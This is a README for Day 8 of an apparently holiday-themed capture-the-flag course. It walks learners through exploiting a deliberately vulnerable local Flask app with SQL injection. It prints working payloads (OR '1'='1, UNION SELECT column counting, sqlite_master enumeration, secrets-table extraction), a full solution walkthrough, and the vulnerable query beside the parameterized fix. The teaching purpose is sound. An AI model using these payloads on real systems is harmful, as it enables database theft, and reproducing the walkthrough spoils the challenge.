[← Previous Day](../day07/README.md) | [Main README](../README.md) | **Day 8** | [Next Day →](../day09/README.md)

---

![Day 8](../Images/Day08.png)

# 🎄 Day 8 (December 19) - Nice List Database Heist

## 🎅 The Story

**December 19, 2024 - 04:15 AM (North Pole Time)**

Ginger Snowflake's phone vibrates violently on her nightstand, the alarm tone piercing through her dreams. She groggily reaches for it, squinting at the bright screen.

**DATABASE ALERT: Unusual Query Activity**
**SERVER: NICE_LIST_PRIMARY**
**TIME: 04:13:42 AM**
**SEVERITY: CRITICAL**

As the North Pole's Senior Database Administrator, Ginger has spent three years maintaining the Nice List Database—2.7 million records of children's names, addresses, behavioral scores, and gift preferences. It's the most critical system at the North Pole.

And someone's attacking it. At 4 AM. Six days before Christmas.

She pulls up the database monitoring dashboard and her stomach drops.

**Query Count (Last 60 Minutes):**
- Normal hourly average: 1,200 queries
- Current count: **47,823 queries**

"That's... forty times normal traffic," she whispers.

The queries scroll past her screen. At first everything looks normal, but then at timestamp `2024-12-19 03:47:12`, the pattern changes:

```sql
SELECT * FROM nice_list WHERE child_id = 1' OR '1'='1
SELECT * FROM nice_list WHERE child_id = 1' UNION SELECT table_name FROM sqlite_master--
SELECT * FROM nice_list WHERE child_id = 1' UNION SELECT secret_value FROM secrets--
```

"SQL injection," she breathes. "Someone's using SQL injection to dump the entire database."

Merry Tinselcode's voice cuts into the emergency call. "I'm looking at the application logs. The vulnerable endpoint is `/api/v2/nice-list/lookup`. It takes a `child_id` parameter and queries the database directly **without input validation**."

"Classic SQL injection vulnerability," Ginger confirms grimly.

Tom Icicle joins the call. "I traced the attack source: **IP 203.0.113.99**—same infrastructure as Day 3, Day 4, Day 5, and Day 7. This is Jack Frost."

Dekker Frostbeard's voice is steel. "So let me get this straight. Jack Frost:
- Day 6: Scanned our web services and identified database endpoints
- Day 7: Tested DNS tunneling for exfiltration
- **Day 8: Used SQL injection to dump the Nice List database**
- Exfiltrated 47,823 children's records"

"That's an advanced persistent threat," Merry says quietly. "This is a coordinated, multi-stage attack."

Tom is already analyzing. "The application code has the vulnerability right here:

```python
query = f"SELECT * FROM nice_list WHERE child_id = {child_id}"
cursor.execute(query)
```

No parameterized queries. No input validation. User input directly concatenated into SQL. This is Security 101, and we failed."

Ginger stares at the vulnerable code, her expertise kicking in. "We need to understand exactly how he exploited this. I'm going to replicate his attack in our test environment. If I can recreate the exploit, we'll know every piece of data he stole."

---

## 🎯 **YOUR MISSION: Hack the Vulnerable Application!**

**This is NOT a passive log analysis challenge!**

You will:
✅ Run a real vulnerable web application on your computer
✅ Craft actual SQL injection payloads
✅ Exploit it step-by-step like Jack Frost did
✅ Extract the flag from the database yourself

**This is hands-on hacking!** 🎉

---

## 🛠️ Prerequisites & Setup

**You'll need:**
- Python 3.7 or higher
- Flask (Python web framework)
- A web browser
- 15-20 minutes for setup and exploitation

**Don't worry if you've never used Python!** We provide a complete setup guide.

### 📋 Setup Steps:

1. **Install Python** (if not already installed)
2. **Install Flask** (`pip install flask`)
3. **Run the web app** (`python3 app.py`)
4. **Open your browser** to `http://localhost:5000`
5. **Start hacking!**

📖 **Complete setup instructions:** See `artifacts/SETUP_GUIDE.txt`

**Estimated setup time:** 5-10 minutes (most of it is installing Python/Flask)

---

## 📚 Lesson: Learn the Technique

**Before starting this challenge, read the lesson:**
📖 [SQL Injection - What, Why, and How](./lesson_sql_injection.md)

This comprehensive lesson covers:
- What SQL is and how databases work
- How web applications use SQL to query databases
- **What SQL injection is and why it's the #1 web vulnerability**
- UNION-based SQL injection technique
- information_schema / sqlite_master enumeration
- How to craft SQL injection payloads
- Real-world examples (Equifax, Heartland, Sony breaches)
- How to prevent SQL injection

**New to SQL injection?** The lesson assumes zero database knowledge!

**Already know SQL injection?** Jump straight to the challenge! 🚀

---

## 🎯 The Challenge

You are **Ginger Snowflake**, recreating Jack Frost's attack to understand what data was stolen.

**Your mission:**

1. ✅ Set up and run the vulnerable web application
2. ✅ Test for SQL injection vulnerability
3. ✅ Enumerate database tables using UNION SELECT
4. ✅ Discover the `secrets` table
5. ✅ Extract the flag from the database
6. ✅ Understand how to prevent this vulnerability

**This is NOT about reading logs - you're actually EXPLOITING a real vulnerability!**

---

## 🔍 Artifacts

**Password required:** Use Day 7's flag to extract `day08_artifacts.zip`

After extracting, the `artifacts/` folder contains:

- **`app.py`** - The vulnerable Flask web application ← **This is what you'll hack!**
- **`nice_list.db`** - The SQLite database containing the Nice List
- **`SETUP_GUIDE.txt`** - Complete setup instructions for Python/Flask
- **`exploitation_guide.txt`** - Progressive hints for exploiting the app ← **Read this if you get stuck!**
- **`database_schema.txt`** - Database structure reference

### Quick Start:

```bash
# 1. Install Flask
pip3 install flask

# 2. Run the app
python3 app.py

# 3. Open browser to:
http://localhost:5000
```

---

## 🎁 Your Mission

**Exploit the SQL injection vulnerability to extract the flag from the database.**

The flag is hidden in the `secrets` table. You'll need to:
- Test if the application is vulnerable
- Determine how many columns the query returns
- Enumerate database tables
- Extract data from the `secrets` table
- Find the flag!

### 💡 Progressive Hints

<details>
<summary>Hint 1: How do I test for SQL injection?</summary>

Try entering this in the `child_id` field:
```
1' OR '1'='1
```

If you see ALL children in the database instead of just one, it's vulnerable!

**Why?** The query becomes:
```sql
SELECT ... FROM nice_list WHERE child_id = 1' OR '1'='1
```

The `OR '1'='1'` part is always TRUE, so it returns everything!

</details>

<details>
<summary>Hint 2: How do I find the number of columns?</summary>

Use UNION SELECT with NULL values:

```
1' UNION SELECT NULL--
1' UNION SELECT NULL, NULL--
1' UNION SELECT NULL, NULL, NULL--
```

Keep adding NULLs until you don't get an error. The query uses **6 columns**.

</details>

<details>
<summary>Hint 3: How do I discover all tables?</summary>

In SQLite, the `sqlite_master` table contains metadata about all tables:

```
1' UNION SELECT name, NULL, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table'--
```

You should see tables: `nice_list`, `admin_users`, `secrets`, `elves`

**The `secrets` table looks interesting!**

</details>

<details>
<summary>Hint 4: How do I extract data from the secrets table?</summary>

Now that you know the `secrets` table exists, extract its data:

```
1' UNION SELECT secret_name, secret_value, NULL, NULL, NULL, NULL FROM secrets--
```

You should see several secrets, including one named "security_flag"!

</details>

<details>
<summary>Hint 5: How do I get JUST the flag?</summary>

Filter for only the flag:

```
1' UNION SELECT NULL, NULL, secret_value, NULL, NULL, NULL FROM secrets WHERE secret_name='security_flag'--
```

**Note:** The flag value is base64 encoded for security. You'll need to decode it!

Use this command to decode:
```bash
echo "BASE64_STRING_HERE" | base64 -d
```

Or in Python:
```python
import base64
print(base64.b64decode('BASE64_STRING_HERE').decode())
```

</details>

<details>
<summary>Hint 6: Complete walkthrough</summary>

**Step-by-step solution:**

1. **Test vulnerability:**
   ```
   1' OR '1'='1
   ```
   Result: Returns all children = vulnerable!

2. **Find column count:**
   ```
   1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL--
   ```
   Result: No error = 6 columns!

3. **Enumerate tables:**
   ```
   1' UNION SELECT name, NULL, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table'--
   ```
   Result: nice_list, admin_users, secrets, elves

4. **Extract flag:**
   ```
   1' UNION SELECT secret_name, secret_value, NULL, NULL, NULL, NULL FROM secrets WHERE secret_name='flag'--
   ```
   Result: **FROST{...}** (The flag from the secrets table)

**For detailed explanations, see `exploitation_guide.txt`!**

</details>

---

## 🤔 Questions to Consider

As you solve this challenge, think about:

1. **Why is SQL injection the #1 web vulnerability?** (Easy to exploit, devastating impact)
2. **How does UNION SELECT work?** (Combines two queries into one result)
3. **Why is user input dangerous in SQL queries?** (It's treated as CODE, not DATA)
4. **How does this connect to Day 6?** (Jack Frost discovered this endpoint via reconnaissance)
5. **What should the developers have done?** (Use parameterized queries!)
6. **Why does `--` appear at the end of payloads?** (SQL comment - ignores rest of query)
7. **What's the difference between this and password cracking?** (Direct exploitation vs offline attack)
8. **Why is hands-on exploitation better than reading logs?** (You learn by DOING!)

---

## ➡️ Next Steps

Once you've exploited the application and found the flag, use it to unlock **Day 9's** artifacts:

1. Navigate to `../day09/`
2. Find `day09_artifacts.zip`
3. Use your Day 8 flag (including `FROST{}`) as the password
4. Continue the investigation...

Jack Frost has the Nice List database. What will he do next? 🎄

---

**Difficulty:** Medium (hands-on exploitation)
**Estimated Time:** 30-45 minutes (including setup)
**Skills:** SQL injection, web exploitation, database enumeration, UNION-based attacks
**Tools Needed:** Python 3, Flask, Web browser
**Uses Previous Skills:** Pattern recognition (Day 2) ✅ | Web reconnaissance understanding (Day 6) ✅ | Attack correlation (Day 7) ✅

**NEW Skills Learned:**
- ✅ Setting up and running web applications
- ✅ Hands-on SQL injection exploitation
- ✅ UNION-based attacks
- ✅ Database enumeration via sqlite_master
- ✅ Crafting SQL injection payloads
- ✅ Boolean testing (OR '1'='1')
- ✅ Real web application security testing

---

## 🎓 Real-World Context

SQL injection is the **#1 web application vulnerability** according to OWASP.

**Famous SQL injection attacks:**
- **2017: Equifax** - 147 million records exposed
- **2008: Heartland Payment** - 134 million credit cards stolen ($140M damages)
- **2011: Sony PlayStation** - 77 million accounts, 23-day outage
- **2012: Yahoo Voices** - 450,000 passwords stolen

**Why so common?**
1. Easy to exploit (simple payloads like `' OR '1'='1`)
2. High impact (full database access)
3. Developer mistakes (string concatenation)
4. Legacy code without parameterized queries

**Prevention:**
✅ **Parameterized queries** (prepared statements)
✅ **Input validation** (whitelist allowed characters)
✅ **Least privilege** (database accounts with minimal permissions)
✅ **Web Application Firewalls** (detect and block attacks)

**The North Pole's mistake:**
```python
# VULNERABLE
query = f"SELECT * FROM nice_list WHERE child_id = {child_id}"
```

**Should have been:**
```python
# SECURE
query = "SELECT * FROM nice_list WHERE child_id = ?"
cursor.execute(query, (child_id,))
```

One line of insecure code exposed 2.7 million records!

---

## ❓ Troubleshooting

**Problem:** Can't install Python/Flask
**Solution:** See detailed platform-specific instructions in `SETUP_GUIDE.txt`

**Problem:** App won't start
**Solution:** Make sure you ran `create_database.py` FIRST

**Problem:** Page shows errors
**Solution:** That's normal! Errors help you learn the database structure

**Problem:** Stuck on exploitation
**Solution:** Read `exploitation_guide.txt` for step-by-step hints

**Problem:** Want more practice
**Solution:** Try the advanced challenges in `exploitation_guide.txt`!

---

**Ready to hack? Let's go!** 🎄

Remember:
- This is INTENTIONALLY vulnerable for learning
- NEVER deploy code like this in production
- Use parameterized queries in real applications
- SQL injection is a REAL threat affecting real websites

**Have fun and happy hacking!** 🎁
